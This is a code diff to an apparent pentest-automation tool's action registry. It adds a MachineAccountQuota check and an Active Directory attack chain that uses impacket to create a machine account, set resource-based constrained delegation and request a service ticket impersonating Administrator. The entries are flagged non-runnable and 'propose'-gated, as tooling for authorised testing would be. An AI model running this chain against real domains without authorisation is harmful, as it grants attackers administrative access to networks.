@@ -306,6 +306,22 @@ ACTION_REGISTRY: dict[str, Action] = {
     "enum4linux_ng": _a("enum4linux_ng", ["enum4linux-ng $IP"], outputs="raw"),
     "smbmap_shares": _a("smbmap_shares", ["smbmap -H $IP -u '' -p ''"], outputs="raw"),
     "netexec_ldap": _a("netexec_ldap", ["nxc ldap $IP -u '' -p ''"], outputs="raw"),
+    "netexec_maq": _a("netexec_maq",
+        ["nxc ldap $IP -u <USER> -p '<PASS>' -M maq"],
+        runnable=False, outputs="raw",
+        note="Read ms-DS-MachineAccountQuota. >0 lets any domain user add a computer account "
+             "-> RBCD / noPac. Needs a valid domain cred."),
+    "rbcd_addcomputer_attack": _a("rbcd_addcomputer_attack",
+        ["# MachineAccountQuota > 0: add a computer, set RBCD on the target, then S4U:",
+         "impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Passw0rd!' "
+         "-dc-host $IP -domain-netbios <NETBIOS> '$DOMAIN/<USER>:<PASS>'",
+         "impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write "
+         "'$DOMAIN/<USER>:<PASS>'",
+         "impacket-getST -spn 'cifs/<TARGET>.$DOMAIN' -impersonate Administrator "
+         "'$DOMAIN/EVIL$:Passw0rd!'"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Resource-Based Constrained Delegation via a self-created machine account "
+             "(MachineAccountQuota abuse). Yields a service ticket as Administrator to the target."),
     "ldapsearch_anon": _a("ldapsearch_anon",
         ["ldapsearch -x -H ldap://$IP -s base namingcontexts"], outputs="raw"),
 
